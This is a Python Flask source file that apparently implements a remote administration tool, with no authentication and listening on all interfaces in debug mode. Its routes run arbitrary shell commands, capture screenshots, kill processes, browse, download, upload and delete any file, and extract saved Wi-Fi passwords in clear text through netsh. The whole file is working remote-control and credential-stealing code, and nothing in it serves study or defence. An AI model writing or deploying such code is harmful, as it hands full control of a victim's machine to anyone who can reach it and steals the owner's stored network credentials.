from flask import Flask, render_template, request, jsonify, send_file
import os
import platform
import psutil
import json
import tempfile
import subprocess
import threading
import time
from datetime import datetime
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Load config
with open('config.json') as f:
    config = json.load(f)

# System manager class (simplified version)
class SystemManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.systems = {}
            cls._instance.active_system = None
        return cls._instance
    
    def register_system(self):
        system_id = f"{platform.node()}_{int(time.time())}"
        self.systems[system_id] = {
            'id': system_id,
            'name': platform.node(),
            'ip': self._get_ip(),
            'os': f"{platform.system()} {platform.release()}",
            'cpu_cores': os.cpu_count(),
            'ram_gb': round(psutil.virtual_memory().total / (1024**3)),
            'last_seen': datetime.now(),
            'is_admin': os.getuid() == 0 if hasattr(os, 'getuid') else False,
            'is_active': True
        }
        self.active_system = system_id
        return system_id

    
    def _get_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"

# Initialize system manager
manager = SystemManager()
system_id = manager.register_system()

# Routes
@app.route('/')
def index():
    return render_template('index.html', system=manager.systems[system_id])

@app.route('/command', methods=['POST'])
def execute_command():
    cmd = request.json.get('command')
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return jsonify({'success': True, 'output': result.decode('utf-8', errors='replace')})
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'output': e.output.decode('utf-8', errors='replace')})

@app.route('/screenshot')
def take_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        temp_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        img.save(temp_path, 'PNG')
        return send_file(temp_path, mimetype='image/png')
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/processes')
def get_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append({
                'pid': proc.info['pid'],
                'name': proc.info['name'],
                'username': proc.info['username']
            })
        return jsonify({'success': True, 'processes': processes})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/kill-process', methods=['POST'])
def kill_process():
    pid = request.json.get('pid')
    try:
        pid = int(pid)
        p = psutil.Process(pid)
        p.terminate()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/wifi')
def get_wifi_passwords():
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
        profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
        
        wifi_data = []
        for profile in profiles:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode('utf-8')
                password = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line][0]
                wifi_data.append({
                    'ssid': profile,
                    'password': password
                })
            except:
                wifi_data.append({
                    'ssid': profile,
                    'password': '<could not retrieve>'
                })
        return jsonify({'success': True, 'wifi': wifi_data})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/file-manager')
def file_manager():
    path = request.args.get('path', os.getcwd())
    try:
        items = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            items.append({
                'name': item,
                'is_dir': os.path.isdir(item_path),
                'size': os.path.getsize(item_path) if not os.path.isdir(item_path) else 0,
                'modified': datetime.fromtimestamp(os.path.getmtime(item_path)).strftime('%Y-%m-%d %H:%M:%S')
            })
        return jsonify({'success': True, 'path': path, 'items': items})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/download')
def download_file():
    file_path = request.args.get('path')
    if not file_path or not os.path.exists(file_path):
        return "File not found", 404
    return send_file(file_path, as_attachment=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'success': False, 'error': 'No file part'})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'success': False, 'error': 'No selected file'})
    
    upload_path = request.form.get('path', os.getcwd())
    try:
        filename = secure_filename(file.filename)
        file.save(os.path.join(upload_path, filename))
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/delete', methods=['POST'])
def delete_file():
    path = request.json.get('path')
    try:
        if os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
        else:
            os.remove(path)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)